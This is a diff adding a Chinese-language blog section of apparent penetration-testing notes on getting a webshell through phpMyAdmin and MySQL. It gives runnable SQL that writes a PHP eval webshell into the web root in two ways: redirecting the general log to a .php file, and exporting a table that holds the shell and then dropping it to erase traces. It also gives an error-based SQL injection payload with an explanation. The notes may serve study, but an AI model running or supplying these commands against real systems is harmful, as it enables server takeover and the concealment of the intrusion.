@@ -101,6 +101,38 @@ exit();
 
  原理和弱等于的类型转换一样
 </code></pre>
+<h3 id="phpMyadmin-getshell-SQL-之-into-outfile，into-dumpfile"><a href="#phpMyadmin-getshell-SQL-之-into-outfile，into-dumpfile" class="headerlink" title="phpMyadmin getshell SQL 之 into outfile，into dumpfile"></a><a herf= "phpMyadmin getshell SQL 之 into outfile，into dumpfile">phpMyadmin getshell SQL 之 into outfile，into dumpfile</a></h3><p><strong>into dumpfile()</strong><br><strong>into outfile ()</strong><br><strong>load_file()</strong></p>
+<p>受参数 <strong>secure_file_priv</strong>的影响</p>
+<p>其中当参数 secure_file_priv 为空时，对导入导出无限制<br>当值为一个指定的目录时，只能向指定的目录导入导出<br>当值被设置为NULL时，禁止导入导出功能<br>这个值可以通过命令 select @@secure_file_priv 查询。由于这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。</p>
+<p><code>select * from test into outfile &quot;c:/outfile.txt&quot;;</code></p>
+<p>outfile函数可以导出多行，而dumpfile只能导出一行数据outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式<br>比如脱裤时，那就用outfile更好使，但是如果用outfife去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏，所以一般导出导出二进制文件(udf提权)时就用dumpfile</p>
+<p><strong>load_file</strong></p>
+<p>必须有权限读取并且文件必须完全可读<br><code>and (select count(*) from mysql.user)&gt;0/*</code>如果结果返回正常,说明具有读写权限。<br><code>and (select count(*) from mysql.user)&gt;0/*</code>返回错误，应该是管理员给数据库帐户降权</p>
+<p><code>set global secure_file_priv = on;</code><br>否则无法找到地址。对了，顺带一提，必须在root用户下才可以进行更改，否则是修改不了的</p>
+<p>basedir 该参数指定了安装 MySQL 的安装路径，填写全路径可以解决相对路径所造成的问题<br>例如：<br><code>basedir=&quot;E:/dev/MySQL/MySQL Server 5.2/&quot;</code><br>则表示我的 MySQL 安装在 E:&#x2F;dev&#x2F;MySQL&#x2F;MySQL Server 5.2&#x2F; 路径下</p>
+<p>datadir 该参数指定了 MySQL 的数据库文件放在什么路径下。数据库文件即我们常说的 MySQL data 文件<br>例如：<br><code>datadir=&quot;E:/dev/MySQL/MySQL Server 5.2/Data/&quot;</code><br>则表示我的 MySQL 数据库文件放在 E:&#x2F;dev&#x2F;MySQL&#x2F;MySQL Server 5.2&#x2F;Data&#x2F; 路径下<br><code>select @@datadir;</code><br><code>select @@basedir;</code></p>
+<p> select version();  – 查看数据库版本<br> select @@datadir;  – 查看数据库存储路径<br> show VARIABLES like ‘%char%’;  – 查看系统变量  variables  </p>
+<h2 id="查询全局日志变量"><a href="#查询全局日志变量" class="headerlink" title="查询全局日志变量"></a><b herf= "查询全局日志变量">查询全局日志变量</b></h2><p><strong>查询全局日志变量</strong><br> <code>show variables like &#39;%general%&#39;;</code><br> <code> Variable_name     Value</code><br> <code>general_log       OFF       </code>                              日志保存状态<br> <code>general_log_file  G:\phpStudy\MySQL\data\FengSec.log    </code>  日志保存路径</p>
+<p> <code>set global general_log=on;#</code> 开启日志</p>
+<p> <code>set global general_log_file=&#39;C:/phpStudy/WWW/yxcms/hack.php&#39;;#</code> 设置日志位置为网站目录</p>
+<p>接下来<br> <code>select &#39;&lt;?php eval($_REQUEST[8]); ?&gt;&#39;</code><br> 然后直接链接菜刀，蚂舰就可以了</p>
+<h2 id="新表Getshell"><a href="#新表Getshell" class="headerlink" title="新表Getshell"></a><c herf= "新表Getshell">新表Getshell</c></h2><p><strong>新表Getshell</strong></p>
+<p>思路就是新建表，然后在表中写入马 ，之后再把表中的数据导入到php马中，最后删除表，抹除痕迹</p>
+<p> <code>Create TABLE shell_table (xiaoma text NOT NULL) -- 建表</code><br><code> Insert INTO shell_table (xiaoma) VALUES(&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);  -- 写入</code><br> <code>select * from shell_table into outfile &#39;G:/phpstudy/WWW/shell.php&#39;;   -- 导出</code><br> <code>Drop TABLE IF EXISTS shell_table;    -- 删表</code></p>
+<h3 id="count-floor-rand-0-2-group-by-报错注入"><a href="#count-floor-rand-0-2-group-by-报错注入" class="headerlink" title="count(*) floor(rand(0)*2) group by 报错注入"></a><a2 herf= "count(*) floor(rand(0)*2) group by 报错注入 ">count(*) floor(rand(0)*2) group by 报错注入</a2></h3><p>先来一个经典注入语句<br> <code>and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+<p> <code>count(*) </code>  COUNT(*) 函数返回表中的记录数：  我的理解就是看有几行</p>
+<p> <code>group by</code>   就是按照xxx排序</p>
+<p> <code>floor</code>      就是向下取整</p>
+<p> <code>rand</code>       是取一个0到1的随机数</p>
+<p> <code>rand()</code> 这样取的数没有规律   <code>rand(0)</code>这样取得数有规律    <code>rand(0)*2</code>  规律就是 011</p>
+<p> 然后为什么前面要有一个 select 1呢 因为一般 id&#x3D;1   and 后面也要是一个布尔值 1，0或者一个其他的数，这个报错注入的结果是一个虚表所以要加上来</p>
+<p> 报错原理就是</p>
+<p>让floor(rand(0)*2)等于  <strong>A</strong></p>
+<ol>
+<li>查询<strong>A</strong>（第一次运行此时是0）没出现过插入<strong>A</strong>（第二次运行插入的是1）   count<strong>1</strong> +1  &#x3D;1</li>
+<li>查询<strong>A</strong>（第三次运行此时是1）出现过                                   count<strong>1</strong> +1  &#x3D;2</li>
+<li>查询<strong>A</strong>（第四次运行此时是0）没出现过插入<strong>A</strong>（第五次运行插入的是1）   <strong>但是表中已经有1了所以报错</strong></li>
+</ol>
 
                 
                 <p class="end">__END__</p>
